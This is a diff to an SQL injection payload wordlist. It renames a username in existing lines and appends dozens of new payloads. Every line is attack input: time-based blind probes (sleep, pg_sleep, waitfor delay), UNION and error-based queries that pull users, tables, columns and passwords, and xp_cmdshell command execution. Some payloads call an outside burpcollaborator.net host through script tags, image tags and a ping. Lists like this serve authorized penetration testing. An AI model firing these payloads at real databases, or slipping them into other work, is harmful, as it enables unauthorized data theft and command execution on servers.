@@ -21,7 +21,7 @@ admin"%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20
 'xor(if(now()=sysdate(),sleep(30),0))or
 
 admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
-orwa(select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
+admin(select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 if(now()=sysdate()%2Csleep(15)%2C0)
 admin';%20waitfor%20delay%20'0:0:15'%20--%20
 admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--
@@ -30,30 +30,30 @@ admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--
 admin'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
 (select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 gGBw={vsCx}&firc=<
-orwa';%20waitfor%20delay%20'0:0:15'%20--%20
+admin';%20waitfor%20delay%20'0:0:15'%20--%20
 if(now()=sysdate()%2Csleep(15)%2C0)
 c4aQYcql
 1%20waitfor%20delay%20'0:0:15'%20--%20
 1%20waitfor%20delay%20'0:0:15'%20--%20
 1%00%C0%A7%C0%A2%252527%252522
 0%27XOR(if(now()=sysdate(),sleep(11),0))XOR%27Z
-orwa'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z
-orwa"XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR"Z
-orwa-1"%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20
+admin'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z
+admin"XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR"Z
+admin-1"%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20
 (select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 %40%40KFdwo
 u]H[ww6KrA9F.x-F'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
-orwa@orwa.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
-orwa%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
+admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'
+admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20
 admin');%20waitfor%20delay%20'0:0:9'
 'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or
-orwa')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--
-orwa'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--
-orwa';%20waitfor%20delay%20'0:0:15'%20--%20
+admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--
+admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--
+admin';%20waitfor%20delay%20'0:0:15'%20--%20
 1%20AND%20(SELECT%208603%20FROM%20(SELECT(SLEEP(10)))xMdQ)
 xx49236287'%20or%208896=8896--
 1)%20OR%20ELT(2023=2023,SLEEP(5))#
-orwa'%20OR%201=1--
+admin'%20OR%201=1--
 (SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))
 10%20AND%20(SELECT%201030%20FROM(SELECT%20COUNT(*),CONCAT(0x7176717071,(SELECT%20(ELT(1030=1030,1))),0x7176717871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)
 10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(5)))jQqq)
@@ -63,10 +63,10 @@ orwa'%20OR%201=1--
 if(now()=sysdate()%2Csleep(15)%2C0)
 Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--
 20PVEY5L
-orwa'"
+admin'"
 1;SELECT IF((8303>8302),SLEEP(13),2356)#
-orwa%27;%20waitfor%20delay%20%270:0:5%27%20--%20
-orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20 
+admin%27;%20waitfor%20delay%20%270:0:5%27%20--%20
+admin%27);%20waitfor%20delay%20%270:0:6%27%20--%20 
 1%20waitfor%20delay%20'0:0:15'%20--%20
 1%00%C0%A7%C0%A2%252527%252522
 0'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z
@@ -78,12 +78,12 @@ orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20
 -1"%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20
 (select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
 (select(0)from(select(sleep(15)))v)/*'%2B(select(0)from(select(sleep(15)))v)%2B'"%2B(select(0)from(select(sleep(15)))v)%2B"*/
-%40%408orwa
+%40%408admin
 )%20or%20('x'='x
 %20or%201=1
 (select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
-orwa';%20waitfor%20delay%20'0:0:6'%20--%20
-orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
+admin';%20waitfor%20delay%20'0:0:6'%20--%20
+admin') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 (select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
 '||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
 ' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
@@ -210,57 +210,57 @@ a' or 1=1--
 a' or 'a' = 'a
 declare @s varchar(22) select @s =
  or 2 between 1 and 3
- or a=a--
+ or a=a-- 
  or '1'='1
 |
  or sleep(__TIME__)='
- or 1 --'
+ or 1 -- '
 or 0=0 #"
 having
 a'
 " or isNULL(1/0) /*
 declare @s varchar (8000) select @s = 0x73656c ...
-â or 1=1 --
+â or 1=1 -- 
 char%4039%41%2b%40SELECT
 order by
 bfilename
- having 1=1--
+ having 1=1-- 
 ) or benchmark(10000000,MD5(1))#
  or username like char(37);
-;waitfor delay '0:0:__TIME__'--
-" or 1=1--
-x' AND userid IS NULL; --
+;waitfor delay '0:0:__TIME__'-- 
+" or 1=1-- 
+x' AND userid IS NULL; -- 
 */*
  or 'text' > 't'
  (select top 1
  or benchmark(10000000,MD5(1))#
-");waitfor delay '0:0:__TIME__'--
-a' or 3=3--
+");waitfor delay '0:0:__TIME__'-- 
+a' or 3=3-- 
  -- &password=
- group by userid having 1=1--
+ group by userid having 1=1-- 
  or ''='
 ; exec master..xp_cmdshell
 %20or%20x=x
 select
 ")) or sleep(__TIME__)="
 0x730065006c0065006300740020004000400076006500 ...
-hi' or 1=1 --
-") or pg_sleep(__TIME__)--
+hi' or 1=1 -- 
+") or pg_sleep(__TIME__)-- 
 %20or%20'x'='x
  or 'something' = 'some'+'thing'
 exec sp
 29 %
 (
-Ã½ or 1=1 --
-1 or pg_sleep(__TIME__)--
+Ã½ or 1=1 -- 
+1 or pg_sleep(__TIME__)-- 
 0 or 1=1
 ) or (a=a
 uni/**/on sel/**/ect
 replace
 %27%20or%201=1
-)) or pg_sleep(__TIME__)--
+)) or pg_sleep(__TIME__)-- 
 %7C
-x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND 1=(SELECT COUNT(*) FROM tabname); -- 
 &apos;%20OR
 ; or '1'='1'
 declare @q nvarchar (200) select @q = 0x770061 ...
@@ -270,7 +270,7 @@ declare @q nvarchar (200) select @q = 0x770061 ...
 /
 anything' OR 'x'='x
 declare @q nvarchar (4000) select @q =
-or 0=0 --
+or 0=0 -- 
 desc
 ||'6
 )
@@ -279,9 +279,9 @@ or 0=0 #
  select name from syscolumns where id = (sele ...
 hi or a=a
 *(|(mail=*))
-password:*/=1--
+password:*/=1-- 
 distinct
-);waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:__TIME__'-- 
 to_timestamp_tz
 ") or benchmark(10000000,MD5(1))#
  UNION SELECT
@@ -290,19 +290,19 @@ to_timestamp_tz
  or 1=1 /*
 )) or sleep(__TIME__)='
 or 1=1 or ""=
- or 1 in (select @@version)--
+ or 1 in (select @@version)-- 
 sqlvuln;
  union select * from users where login = char ...
 x' or 1=1 or 'x'='y
 28 %
-â or 3=3 --
+â or 3=3 -- 
 @variable
- or '1'='1'--
-"a"" or 1=1--"
+ or '1'='1'-- 
+"a"" or 1=1-- "
 //*
 %2A%7C
-" or 0=0 --
-")) or pg_sleep(__TIME__)--
+" or 0=0 -- 
+")) or pg_sleep(__TIME__)-- 
 ?
  or 1/*
 !
@@ -313,22 +313,22 @@ declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A3130
 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 ' or 1=1
- or 1=1 --
+ or 1=1 -- 
 x' OR full_name LIKE '%Bob%
-'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'-- 
 '%20or%20''='
 '%20or%20'x'='x
 ')%20or%20('x'='x
-' or 0=0 --
+' or 0=0 -- 
 ' or 0=0 #
  or 0=0 #"
-' or 1=1--
-' or '1'='1'--
-' or 1 --'
-or 1=1--
+' or 1=1-- 
+' or '1'='1'-- 
+' or 1 -- '
+or 1=1-- 
 ' or 1=1 or ''='
  or 1=1 or ""=
-' or a=a--
+' or a=a-- 
  or a=a
 ') or ('a'='a
 'hi' or 'x'='x';
@@ -342,7 +342,7 @@ handler
 ' or user like '%
 '; exec master..xp_cmdshell
 '; exec xp_regread
-t'exec master..xp_cmdshell 'nslookup www.google.com'--
+t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
 --sp_password
 ' UNION SELECT
 ' UNION ALL SELECT
@@ -359,15 +359,15 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 %21
 ' or ''='
 ' or 3=3
- or 3=3 --
+ or 3=3 -- 
 ')) or sleep(5)='
-;waitfor delay '0:0:5'--
-);waitfor delay '0:0:5'--
-';waitfor delay '0:0:5'--
-";waitfor delay '0:0:5'--
-');waitfor delay '0:0:5'--
-");waitfor delay '0:0:5'--
-));waitfor delay '0:0:5'--
+;waitfor delay '0:0:5'-- 
+);waitfor delay '0:0:5'-- 
+';waitfor delay '0:0:5'-- 
+";waitfor delay '0:0:5'-- 
+');waitfor delay '0:0:5'-- 
+");waitfor delay '0:0:5'-- 
+));waitfor delay '0:0:5'-- 
 "><script src=//xxx.burpcollaborator.net></script>
 0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z
 ; DECLARE @command varchar(255); SELECT @command='ping xxx.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'
@@ -375,3 +375,84 @@ t'exec master..xp_cmdshell 'nslookup www.google.com'--
 %3C%22img src='https://xxx.burpcollaborator.net'%22%3E
 0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z/
 "XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
+admin' AND SLEEP(5)-- 
+admin' AND pg_sleep(5)-- 
+admin' AND BENCHMARK(5000000,MD5(1))-- 
+admin' AND IF(1=1, SLEEP(5), 0)-- 
+admin' AND IF(1=1, pg_sleep(5), 0)- 
+admin' AND IF((SELECT 'abc' FROM dual)='abc', SLEEP(5), 0) -- 
+admin' AND IF((SELECT COUNT(*) FROM information_schema.tables)=10, SLEEP(5), 0) -- 
+admin' AND '1'='1'-- 
+admin' AND '1'='2'-- 
+admin' AND (SELECT 1 FROM DUAL WHERE 1=1)-- 
+admin' AND (SELECT 1 FROM DUAL WHERE 1=2)-- 
+' OR '1'='1
+" OR "1"="1
+' OR 'x'='x
+' OR 1=1-- 
+' OR 'a'='a
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1-- 
+" OR 1=1#
+" OR 1=1
+OR 1=1-- 
+OR 1=1
+OR 1=1-- 
+OR 1=1#
+OR 1=1/*
+AND 1=1
+AND 1=1-- 
+AND 1=1#
+AND 1=1/*
+admin' OR '1'='1
+admin' AND '1'='1
+admin' AND 1=1-- 
+%27 OR 1=1-- 
+%22 OR 1=1-- 
+%27 AND 1=1-- 
+%22 AND 1=1-- 
+%27 UNION SELECT 1, DATABASE()-- 
+%22 UNION SELECT 1, USER()-- 
+' UNION SELECT NULL, current_user-- 
+' UNION SELECT NULL, session_user-- 
+' UNION SELECT current_database(), current_user-- 
+' UNION SELECT 1, database()-- 
+' UNION SELECT 1, user()--  
+' UNION SELECT version(), null--  
+' UNION SELECT NULL, NULL-- 
+' UNION SELECT 1, 'password' FROM users-- 
+' UNION SELECT 1, table_name FROM information_schema.tables-- 
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- 
+' UNION SELECT NULL, table_schema, table_name FROM information_schema.tables-- 
+' AND 1=CONVERT(int, (SELECT CASE WHEN (1=1) THEN 1 ELSE CAST(1 AS INT) END))-- 
+' AND 1=CONVERT(int, (SELECT CASE WHEN (1=2) THEN 1 ELSE CAST(1 AS INT) END))-- 
+' UNION SELECT NULL, banner FROM v$version-- 
+' UNION SELECT table_name FROM all_tables-- 
+' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- 
+' AND 1=CONVERT(int, @@version)-- 
+' AND 1=CONVERT(int, DATABASE())-- 
+' AND 1=CONVERT(int, USER())-- 
+' AND 1=CAST(version() AS int)-- 
+' AND 1=CAST(DATABASE() AS int)-- 
+' AND 1=CAST(USER() AS int)-- 
+' AND SLEEP(5)-- 
+' AND pg_sleep(5)-- 
+' AND BENCHMARK(5000000, MD5(1))-- 
+' AND IF(1=1, SLEEP(5), 0)-- 
+' AND IF(1=1, pg_sleep(5), 0)-- 
+1 AND SLEEP(5)-- 
+1 AND pg_sleep(5)-- 
+'; SELECT * FROM users-- 
+'; EXEC xp_cmdshell('ping 10.10.1.1')-- 
+'; EXEC sp_executesql N'SELECT @@version'-- 
+'; EXEC('SELECT * FROM users WHERE username=''admin''')-- 
+'; EXEC('SELECT * FROM orders WHERE order_id=102')-- 
+'; EXEC('SELECT * FROM payments WHERE user_id=1')-- 
+' UNION SELECT 1, user(), database()-- 
+' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()-- 
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- 
+admin' UNION SELECT NULL, table_name FROM information_schema.tables-- 
+admin' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=DATABASE()-- 
+admin' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'-- 
+admin' UNION SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE()-- 
